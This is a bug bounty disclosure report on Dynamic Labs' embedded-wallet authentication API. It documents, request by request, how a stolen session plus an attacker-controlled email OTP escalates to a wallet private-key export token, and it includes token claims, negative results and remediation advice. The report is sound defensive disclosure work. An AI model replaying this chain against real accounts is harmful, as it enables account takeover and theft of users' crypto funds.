# BUG-003 — FINAL REPORT: Unauthorized email-credential binding → step-up hijack → wallet private-key export

**Target:** Dynamic Labs (app.dynamic.xyz / app.dynamicauth.com) — dashboard-login env `fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9`
**Researcher:** zeno0 (Bugcrowd) | **Test window:** 2026-10-26 11:18–12:37 UTC
**Classification:** P1 candidate (privilege escalation → wallet private key export)

---

## Executive summary

`POST /sdk/{env}/emailVerifications/verify` binds an **arbitrary attacker-chosen email** onto a
victim account as a `signInEnabled: true` verified credential using **only a stolen session JWT +
an OTP the attacker himself receives**. The victim (account owner) is never asked to approve the
addition, and possession of the victim's *email* is never proven.

Because `stepUp/check` treats **all verified email credentials** as OTP-eligible for elevated
scopes (the attacker-attached email becomes the **default** credential), the attacker then
receives the **wallet:export step-up OTP in their own inbox** and mints an
**elevated access token** (`scope: wallet:export`), which **passes the `privateKey/export`
authorization gate** (403 → 404 differential proven).

**Net impact:** a transient stolen session (≤24h) converts into **full embedded-wallet private
key export capability**, and the attached credential makes the escalation **repeatable at will**
— i.e., a persistent capability backdoor on the account. For any wallet-holding user this is
complete fund-drain capability.

---

## Confirmed attack chain (all steps reproduced live)

| # | Step | Request | Result |
|---|------|---------|--------|
| 1 | UNAUTH create | `POST /sdk/{env}/emailVerifications/create {email: attacker@…}` | **201** — no auth, no captcha, arbitrary email |
| 2 | Bind to victim | `POST …/emailVerifications/verify` + `Authorization: Bearer <victim minifiedJwt>` + `{verificationUUID, verificationToken: <OTP to attacker inbox>, sessionPublicKey: <victim session_public_key claim>}` | **200** — attacker email attached to victim as verified credential `signInEnabled: true` |
| 3 | OTP-eligibility hijack | `POST …/stepUp/check {scope:"wallet:export"}` with victim session | **200** — `credentials[] = [attacker email]`, `defaultCredentialId = <attacker credential>` |
| 4 | Step-up OTP to attacker | `POST …/emailVerifications/create {email: <attacker email>, purpose:"wallet:export"}` | **201** — OTP delivered to ATTACKER inbox |
| 5 | Elevated mint | `POST …/emailVerifications/verify` + victim session + **`requestedScopes:["wallet:export"]`** | **200 + `elevatedAccessToken`** (JWT `scope:"wallet:export"`, `single_use:true`, TTL 5 min) |
| 6 | Gate pass | `POST …/waas/{walletId}/privateKey/export` + `x-dyn-elevated-access-token` | Same live session, bogus walletId: **403 `Elevated access token required`** WITHOUT header → **404** WITH header (auth gate passed; failure only on wallet lookup) |

Key claim evidence (step 2 response `user.verifiedCredentials`):
```json
{"email":"zeno0+ev6@bugcrowdninja.com","id":"c3fe17fa-f2ab-430a-8709-c042ec1fae2a",
 "format":"email","signInEnabled":true,"verifiedAt":"2026-10-26T11:37:05.123Z"}
```

Elevated token claims (step 5):
```json
{"sub":"3428fdb3-…","scope":"wallet:export","single_use":true,
 "iat":1793018143,"exp":1793018443,"aud":"<environmentId>","session_public_key":"3059…"}
```

## What was REFUTED (negative results — also valuable)

1. **Direct persistent signin as victim — NOT achievable.** `emailVerifications/signin` with the
   attached email's OTP does **not** resolve to the victim account: it auto-registers a **new
   user** for that email (proved by `first_visit: 2026-10-26T11:44:22` on the new session while
   the victim attachment predates it at 11:37:05). Signin identity appears keyed to the
   account's primary credential, not secondary attached credentials.
2. **Session-conflict side effect:** the signin/auto-signup event coincided with revocation of
   the victim's active sessions (attack-minted session dead by 11:51:39, "Session is no longer
   active"; original session bare-401 by 12:16 while control TOK_A remained 200).
3. **Key-binding check at verify** compares the supplied `sessionPublicKey` against the
   session's registered key — the claim is authoritative for signin-minted sessions
   (SPKI-DER-hex accepted); real-client dashboard sessions (compressed-format claim) failed the
   match even with the claim verbatim — an inconsistency, possibly itself a minor finding.
4. **Verify rotates sessions:** every successful verify mints a successor session and kills the
   Bearer used (relevant for exploit reliability, and for researchers reproducing).

## Remediation guidance

1. `emailVerifications/verify` (with `Authorization` = existing session) must **not** attach a
   NEW email credential without proof that the ACCOUNT OWNER controls that email. Correct
   pattern: OTP must be sent to the owner's existing verified email for approval, or the new
   email must be verified from a context that proves ownership *before* being marked
   `signInEnabled: true` (pending state until confirmed from the account).
2. `stepUp/check` must exclude credentials that were added without owner-side confirmation
   from the OTP-eligible set — at minimum never select them as `defaultCredentialId`.
3. Consider anomaly flags: email credential added + step-up verification created for the same
   email within a short window from the same session.
4. The verify endpoint's session-rotation behavior silently invalidates the presented session —
   harmless alone, but combined with (1) it currently lets an attacker cycle fresh sessions.

## Evidence index (recon/)

- `recon/idor11/vatk.full` — step-2 attack verify 200 + user object with attached ev6 credential (11:37:05)
- `recon/idor11/vatk_new_session.jwt/.mini` — session minted by the attack verify
- `recon/idor13/p1_victim_session.jwt` — signin result (auto-signup user 3428fdb3, `first_visit` 11:44:22)
- `recon/idor13/create_ev6_signin2.full`, `create_ev7.full` — UNAUTH creates (201)
- `recon/idor13/p1_attach_ev7.full` — ev7 attach 200 on test account (12:27:21)
- `recon/idor13/toka_attach.full` — 422 key-match diagnostics on real-client session (TOK_A)
- `recon/idor13/toka_stepup_check.full` — stepUp/check with TOK_A (200 control)
- `recon/idor13/create_ev7_export.full`, `create_ev7_export_auth.full` — step-up creates (201)
- `recon/idor13/p1_elevated_final.full` — **verify + requestedScopes → elevatedAccessToken** (12:35:42)
- `recon/idor13/elevated.jwt` — the minted elevated token (scope wallet:export)
- `recon/idor13/export_noElev_v5.full` — **403 Elevated access token required** (baseline)
- `recon/idor13/export_withElev_v5.full` — **404** (gate passed, bogus walletId lookup)
- `recon/idor14/*` — hop-2 diagnostics + session-death timeline

## Test identities & cleanup

All accounts used are researcher-controlled Bugcrowd alias inboxes
(`zeno0+sdk1@`, `zeno0+ev6@`, `zeno0+ev7@bugcrowdninja.com`) plus the pre-existing test
accounts A (`zeno0+org@`) and B (`zeno0@`). No real end-user data was accessed, modified, or
exfiltrated. Wallet export was attempted only against a syntactically-invalid wallet UUID
(00000000-1111-…) as a gate-control; no wallet existed on the test account and no key material
was obtained or retained.
